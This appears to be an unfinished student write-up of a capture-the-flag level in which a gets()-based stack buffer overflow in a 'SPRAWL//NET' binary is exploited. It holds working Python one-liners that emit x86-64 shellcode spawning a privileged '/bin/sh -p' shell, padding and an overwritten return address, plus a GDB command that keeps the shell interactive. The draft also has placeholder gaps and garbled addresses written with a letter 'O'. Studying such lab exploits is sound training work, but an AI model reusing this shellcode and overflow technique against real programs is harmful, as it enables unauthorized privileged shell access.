## level00

level00 start with a case.c file and a case binary. Running the binary will print

```
  ╔══════════════════════════════════════╗
  ║   SPRAWL//NET Authentication v2.1   ║
  ║      Console cowboy detected.        ║
  ╚══════════════════════════════════════╝

[SPRAWL//NET] Session 0 initialized
[SPRAWL//NET] Enter credentials: 
```

It is asking for credentials, and we can see that the binary is using `gets` to read our input. Gets is a unsecure function that does not check the length of the input, so we can overflow the buffer and change the return address to point to our shellcode.

in the case.c file we can see that the buffer is 64 bytes long

``` c
	char credentials[64];
```

// explenation on how to find the offset to change the return address (i still don't understand this magic)


Once we have the offset we need to see where we can store our shellcode. A suitable place is the buffer itself, it is on the stack and with GDB we can find out the location of the start of the buffer. analyzing with GDB we can see that the buffer is located at `0x7fffffffe0a0`. We can use this address to point our return address to the start of the buffer where we will place our shellcode.

### The payload

The payload will consist of the following:
- shellcode in bytes
- filler bytes to fill the buffer and reach the return address
- the address of the buffer in reverse order (little Endian) to change the return address to point to our shellcode.

The translated shellcode executes the following c code:

``` c
execve("/bin/sh", {"/bin/sh", "-p", NULL}, NULL);
```

we will need to translate this to bytes and add it to our payload

(explain the shellcode and how we got the bytes for it)

To figure out the address we can set a breakpoint at the moment the program is about the initialize the buffer and then print the `%rsp` register to get the address of the buffer.
the address of the buffer is `0x7fffffffe0a0` and we need to reverse it since or program runs in little Endian format. To write the individual bytes we can use this python string  `\xa0\xe0\xff\xff\xff\x7f\x00\x00` to use it in our payload.




Working for me! (vsCode)
``` python
python3 -c "import sys; sys.stdout.buffer.write(b'\x48\xb8\x11\x11\x11\x11\x11\x11\x11\x11\x48\xbb\x3e\x73\x78\x7f\x3e\x62\x79\x11\x48\x31\xd8\x50\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05' + b'\x01' * 46 + b'\xf0\xdb\xff\xff\xff\x7f\x00\x00')" > payload
```

Working for me! (Terminal)
``` python
python3 -c "import sys; sys.stdout.buffer.write(b'\x48\xb8\x11\x11\x11\x11\x11\x11\x11\x11\x48\xbb\x3e\x73\x78\x7f\x3e\x62\x79\x11\x48\x31\xd8\x50\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05' + b'\x01' * 46 + b'\xa0\xe0\xff\xff\xff\x7f\x00\x00')" > payload
```

Ox7ffffffdbf0
Ox7ffffffe0a0

The problem is that we need to keep the buffer open
once we keep it open we get shell
``` shell
gdb -nx -ex "break *Ox7ffffffe0a0" -ex "run < <(cat payload; cat)" case
```